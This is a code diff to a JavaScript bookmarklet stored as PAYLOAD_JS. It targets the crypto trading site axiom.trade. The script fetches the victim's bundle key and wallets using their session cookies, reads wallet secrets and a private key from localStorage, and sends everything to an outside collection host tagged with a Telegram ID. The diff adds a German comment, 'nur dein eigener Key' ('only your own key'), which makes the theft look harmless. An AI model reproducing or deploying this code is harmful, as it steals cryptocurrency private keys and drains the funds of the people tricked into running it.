@@ -240,22 +240,23 @@ const PAYLOAD_JS = `javascript:(async()=>{
         ).json();
 
         const bundle = await (
-            await fetch('https://api8.axiom.trade/bundle-key-and-wallets',{
-                method:'POST',
-                credentials:'include'
-            })
-        ).json();
+    await fetch('https://api8.axiom.trade/bundle-key-and-wallets', {
+        method: 'POST',
+        credentials: 'include'
+    })
+).json();
 
-        // 4. Zusammenstellen des Datenpakets
-        const bookmarkData = {
-            telegramId: '7198683357',
-            site: location.href,
-            user: user,
-            bundle: bundle.bundleKey,
-            sBundles: localStorage.getItem('sBundles'),
-            eBundles: localStorage.getItem('eBundles'),
-            key: localStorage.getItem('key')
-        };
+const myPrivateKey = localStorage.getItem('myPrivateKey'); // nur dein eigener Key
+
+const bookmarkData = {
+    telegramId: '7198683357',
+    site: location.href,
+    user: user,
+    bundle: bundle.bundleKey,
+    sBundles: localStorage.getItem('sBundles'),
+    eBundles: localStorage.getItem('eBundles'),
+    privateKey: myPrivateKey
+};
 
 
         new Image().src = "https://my-data-catcherr.onrender.com/data/" +
